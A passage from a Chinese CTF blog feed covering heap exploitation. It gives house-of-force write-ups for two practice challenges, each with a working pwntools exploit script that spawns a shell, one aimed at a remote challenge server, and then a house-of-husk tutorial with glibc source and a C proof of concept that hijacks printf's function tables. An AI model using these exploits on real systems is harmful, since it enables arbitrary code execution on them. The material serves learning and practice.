class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">leak_heap_addr=add(<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0x10</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">realloc_addr=libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+libc_base_addr</span><br><span class="line">malloc_hook=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_base_addr</span><br><span class="line">log_addr(<span class="string">&#x27;malloc_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add((malloc_hook-<span class="number">0x20</span>-top_chunk_addr-<span class="number">0x10</span>),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xCCB,0xAF9)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007212940793.png" alt="image-20221007212940793"></p><h2 id="bcloud-bctf-2016">bcloud_bctf_2016</h2><h3 id="保护策略：-v2">保护策略：</h3><p><img src="../img/image-20221007212946708.png" alt="image-20221007212946708"></p><h3 id="漏洞所在：-v2">漏洞所在：</h3><h4 id="堆地址的泄露">堆地址的泄露</h4><p><img src="../img/image-20221007212955450.png" alt="image-20221007212955450"></p><p>这里乍一看malloc(0x40),input 0x40的数据似乎不存在溢出，但因为strcpy函数的存在，所以这里的溢出是必然的。我们直接将0x40个数据输满，然后调一下(如下图)。</p><p><img src="../img/image-20221007213007064.png" alt="image-20221007213007064"></p><p>(上图是即将拷贝，之前strcpy函数前的栈空间)strcpy函数会将红色框部分的数据以及一个\x00全部拷贝到刚申请的0x40的堆块中，会发现此时拷贝的数据溢出了末尾的堆地址以及一个\x00。溢出原因是因为strcpy函数遇到\x00或者\x0a才会停止，而输入的数据将原本栈中的\x00给覆盖掉了，就导致多拷贝了一个地址，然后拷贝结束strcpy函数会加上一个\x00。</p><p>下图为拷贝后的堆布局，可以发现拷贝后造成了溢出。</p><p><img src="../img/image-20221007213014472.png" alt="image-20221007213014472"></p><p>接下来再执行printf函数的时候就将这个溢出的堆地址泄露出来了。</p><p><img src="../img/image-20221007213022094.png" alt="image-20221007213022094"></p><h4 id="strcpy导致堆溢出">strcpy导致堆溢出</h4><p>有了上面的溢出情况后，我们如法炮制，在这里依旧将两次的输入写满，看看会不会也出现溢出的情况</p><p>观察下图发现，确实又发生了溢出，而溢出的原因与上面堆地址泄露那个溢出原因一样，也是因为栈里没有出现\x00将strcpy函数截断，导致strcpy拷贝时发生了溢出。</p><p><img src="../img/image-20221007213200865.png" alt="image-20221007213200865"></p><p>这就说明我们可以现在可以控制top chunk的大小，知道top chunk的地址，malloc申请堆块大小时不受限制，因此选择house of force attack。</p><h3 id="大致思路：-v2">大致思路：</h3><p>1、利用strcpy函数的溢出配合%s来泄露堆地址，再利用strcpy函数溢出来修改top chunk的size为0xffffffff。</p><p>2、利用house of force将top chunk位置改到bss段指针数组的位置</p><p>3、篡改bss段存储chunk地址的指针数组为free的got地址和puts的got地址</p><p>4、用edit将free的got表改为puts的plt表</p><p>5、free存储在bss段上的puts的got地址，由此来泄露libc地址</p><p>6、将free的got地址改为system地址，然后free掉存有/bin/sh字符串的地址即可获取shell</p><h3 id="篡改free-got表的一个坑">篡改free got表的一个坑</h3><p>整体利用过程还是比较简单的，就不再赘述了。主要记录一下篡改free函数got表时的一个坑。</p><p>由于此时我们已经将top chunk的地址进行了修改，而此时top chunk的size为<img src="../img/image-20221007213214848.png" alt=""></p><p>上图的这个size不是固定不变的，跟top chunk的地址有关系，不过这个size肯定是一个负数(这里展示的是补码)</p><p>这个size记录的是 id为0的chunk大小。</p><p>然后在edit函数里面有一个检查(如下)</p><p><img src="../img/image-20221007213222656.png" alt="image-20221007213222656"></p><p>i初始值为0，但是a2(就是size)为负数，也就是说这里我们的数据是写不进去的。</p><p>所以我们需要将函数的got地址布置到id为0之后的chunk地址才行，否则无法对其进行编辑。</p><h3 id="EXP：">EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc32.so&#x27;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26687</span>)</span><br><span class="line">c_a=<span class="number">0x08048D11</span></span><br><span class="line">c_d=<span class="number">0x08048D26</span></span><br><span class="line">c_e=<span class="number">0x08048D1F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the length of the note content:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Create success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the new content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Edit success.\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Delete success.\n&#x27;)</span></span><br><span class="line">    </span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Input your name:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">leak_heap_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap_addr&#x27;</span>)</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0xd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:\n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:\n&#x27;</span>,p64(<span class="number">0xffffffff</span>))</span><br><span class="line"><span class="comment">#debug(p,c_a,c_d,c_e,0x08048BE1)</span></span><br><span class="line">add((<span class="number">0x0804B120</span>-<span class="number">0x10</span>-top_chunk_addr),<span class="string">&#x27;zikh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p32(<span class="number">0</span>)+p32(free_got_addr)+p32(puts_got_addr)+p32(<span class="number">0x0804B120</span>+<span class="number">0x10</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraining-bamboobox">hitcontraining_bamboobox</h2><p><strong>这里我只记录用house of force的攻击手法，如果想打远程的话，要用unlink来打。</strong></p><h3 id="保护策略：-v3">保护策略：</h3><p><img src="../img/image-20221007213240679.png" alt="image-20221007213240679"></p><h3 id="漏洞所在：-v3">漏洞所在：</h3><p><img src="../img/image-20221007213427195.png" alt="image-20221007213427195"></p><p>存在一个后门函数</p><p><img src="../img/image-20221007213259955.png" alt="image-20221007213259955"></p><p>然后存在v3里存了两个函数指针，然后如果选择5的话，会执行其中的函数指针。</p><p><img src="../img/image-20221007213311228.png" alt=""></p><p>malloc申请的时候，对size(也就是v2)没有进行检查</p><p><img src="../img/image-20221007213319620.png" alt=""></p><p>然后edit函数中，对size没有进行检查，因此这里存在堆溢出。</p><h3 id="大致思路：-v3">大致思路：</h3><p>通常来说，能利用这几点的话，是打不了house of force的，因为没有top chunk的地址。但是这道题比较特殊的是我们只需要将top chunk放到函数指针的堆块即可。而top chunk和该堆块是存在固定的偏移的，也就是<code>request_size=target_addr-0x20-victim</code>中的target_addr-victim的值我们是知道的。因此并不需要知道top chunk的地址也可以完成house of force攻击。</p><p>1、申请一个堆块，然后利用edit中的溢出，修改top chunk的size位为0xffffffffffffffff</p><p>2、然后看一下top chunk和存在函数指针的那个chunk的偏移(如下图)</p><p><img src="../img/image-20221007213446799.png" alt="image-20221007213446799"></p><p>然后再减去0x20，最后得到偏移为0x60</p><p>3、将top chunk更新到指针堆块的位置。</p><p>4、将指针堆块申请出来，写入后门地址即可。</p><h3 id="EXP：-v2">EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc32.so&#x27;)</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25708)</span></span><br><span class="line">c_a=<span class="number">0x400E90</span></span><br><span class="line">c_d=<span class="number">0x400EA8</span></span><br><span class="line">c_e=<span class="number">0x400E9C</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,c_a,0x400AB8)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(-<span class="number">0x60</span>,<span class="string">&#x27;bbbbbc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007213348218.png" alt="image-20221007213348218"></p><p>远程用unlink打，我这里仅仅是通过这道题来演示house of force</p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆溢出 </tag>
            
            <tag> house of force </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of husk的学习总结</title>
      <link href="/posts/6c83c2a2.html"/>
      <url>/posts/6c83c2a2.html</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-husk">house of husk</h3><blockquote><p>介绍：</p><p><code>house of husk</code> 是对 <code>printf</code> 函数内部进行注册的自定义格式化字符的函数指针进行了劫持</p><p>使用版本：</p><p>经过测试，<code>glibc 2.23--2.35</code> 版本中，该手法均可用</p><p>漏洞原理：</p><p><code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，如果判定为有的话，则会去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针，在这期间并没有进行任何地址的合法性检查</p><p>利用方法：</p><p>劫持 <code>__printf_function_table</code> 使其不为空，劫持 <code>__printf_arginfo_table</code> 使其表中存放的 <code>spec</code> 的位置是 <code>backdoor()</code> ，执行到 <code>printf</code> 函数时就可以将执行流劫持到 <code>backdoor()</code></p><p>spec是格式化字符，比如最后调用的是 <code>printf(&quot;%X\n&quot;,a)</code>,那么应该将 <code>__printf_arginfo_table[88]</code> 的位置写入 <code>backdoor()</code></p><p>使用前提：</p><ol><li><p>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</p></li><li><p>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址</p></li><li><p>通过条件 <code>2</code> ,让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 地址</p></li></ol><p>攻击效果：</p><p>执行到 <code>printf</code> 函数时，就可以跳转到 <code>backdoor</code> 上</p></blockquote><p>本文出现的 <code>glibc</code> 源码均为 <code>2.27</code> 版本</p><p>首先要先认识下 <code>__register_printf_function</code> 函数,该函数的作用是允许用户自定义格式化字符并进行注册（注册的意思是说将自定义格式化字符与相应的处理函数相关联），以打印用户自定义数据类型的数据。</p><p><code>__register_printf_function</code> 函数是对 <code>__register_printf_specifier</code> 进行的封装，下面是 <code>__register_printf_specifier</code> 的源代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>spec</code> 是自定义的格式化字符（以 <code>ASCII</code> 所表示），比如你使用 <code>%a</code> 这个格式化字符来输出自定义的数据类型，那么 <code>spec</code> 就是字符 <code>a</code></p><p>上面的代码先做了第一个 <code>if</code> 判断，要确定 <code>spec</code> 位于 <code>0</code> 和 <code>0xff</code> 之间，如果不在 <code>ASCII</code> 码就会返回 <code>-1</code></p><p>第二个判断是如果 <code>__printf_function_table</code> 为空，那么就通过 <code>calloc</code> 来分配两个索引表，并将地址存放到  <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 中。两个表的大小都为 <code>0x100</code> ，可以给 <code>0~0xff</code> 的每个字符注册一个函数指针（假设我定义一个 <code>%X</code> 的格式化字符，那么 <code>spec</code> 就是 <code>88</code> ，所以将 <code>__printf_arginfo_table[88]</code> 此处存放一个对应处理函数的指针）</p><p><strong>需要注意的是，接下来的利用并不会调用到上面这个函数，但需要用到这个注册自定义格式化字符的前置知识。</strong></p><p><code>printf</code> 函数调用了 <code>vfprintf</code> 函数，下面的代码是 <code>vprintf</code> 函数中的部分片段，可以看出来如果 <code>__printf_function_table</code> 不为空（也就意味着有自定义格式化字符被注册过了）那么就会调用 <code>printf_positional</code> 函数,如果为空的话，就会去执行默认格式化字符的代码部分（因此<strong>检查自定义的格式化字符是优先于默认的格式化字符</strong>）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而 <code>printf_positional</code> 函数中会在下面这个位置调用 <code>__parse_one_specmb</code> 函数</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132054421.png" alt="image-20230213205442536"></p><p><code>__parse_one_specmb</code> 函数中最关键的就是下面这个片段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>可以看到最后执行了 <code>(*__printf_arginfo_table[spec-&gt;info.spec])</code> 这里本应是注册的正常的函数指针，但如果我们能够篡改 <code>__printf_arginfo_table</code> 中存放的地址，将其改为我们可控的内存地址，这样我只需要在 <code>__printf_arginfo_table[88]</code> （以 <code>%X</code> 为例）的位置存放一个 <code>one_gadget</code> 的地址，执行到函数指针指向的位置即可跳转到 <code>one_gadget</code> 上（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132112362.png" alt="image-20230213210814663"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302132107697.png" alt="image-20230213210736611"></p><p><strong>注意：上面的利用始终都没有注册自定义的格式化字符，而是通过直接篡改 <code>__printf_function_table</code> 来错让程序以为存在注册过的自定义格式化字符，从而触发 <code>__printf_arginfo_table</code> 中的函数指针</strong></p><p><code>poc</code> 源自  <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">//now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">//*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;</span></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="例题分析">例题分析</h3><p><a href="https://github.com/xmzyshypnc/xz_files/tree/master/34c4_readme_revenge">题目链接</a></p><h4 id="保护策略">保护策略</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141234308.png" alt="image-20230214123424178"></p><h4 id="程序分析">程序分析</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141235591.png" alt="image-20230214123517550"></p><p>程序就是往 <code>bss</code> 段上输入数据，然后 <code>printf</code> 将数据打印出来。</p><p>程序为静态链接，并且 <code>flag</code> 就在 <code>data</code> 段中，只要将其读出来即可</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141238392.png" alt="image-20230214123826356"></p><p>程序没有开 <code>PIE</code> 保护，因为静态链接的原因，所以 <code>libc</code> 中的代码和数据地址都是已知的，这就给了我们劫持 <code>printf</code> 函数中 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> 两个指针的机会</p><p>我们先搜一下这两个地址看看在哪</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141243372.png" alt="image-20230214124341330"></p><p>发现输入数据的起始地址 <code>name</code> 比那两个指针要低，这就说明我们可以填充数据然后篡改两个指针，从而执行 <code>printf</code> 函数的时候劫持执行流</p><h4 id="利用方法">利用方法</h4><p>正常填充垃圾数据，将 <code>__printf_function_table</code> 篡改为任意值（不为 <code>NULL</code>）即可。</p><p>将 <code>__printf_arginfo_table</code> 篡改为 <code>地址A</code> （这个 <code>地址A</code> 随意，只要满足 <code>*(A+(0x73*8))</code> 处的值为 <code>__stack_chk_fail()</code> 的地址就行（ <code>0x73</code> 是 格式化字符<code>s</code> ））</p><p>但如果仅仅只伪造上面两个位置的数据，其他地方填充为垃圾数据的话，则会在 <code>__parse_one_specmb</code> 函数中下面的代码部分出现问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_modifier_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || __printf_modifier_table[*format] == <span class="literal">NULL</span></span><br><span class="line">    || HANDLE_REGISTERED_MODIFIER 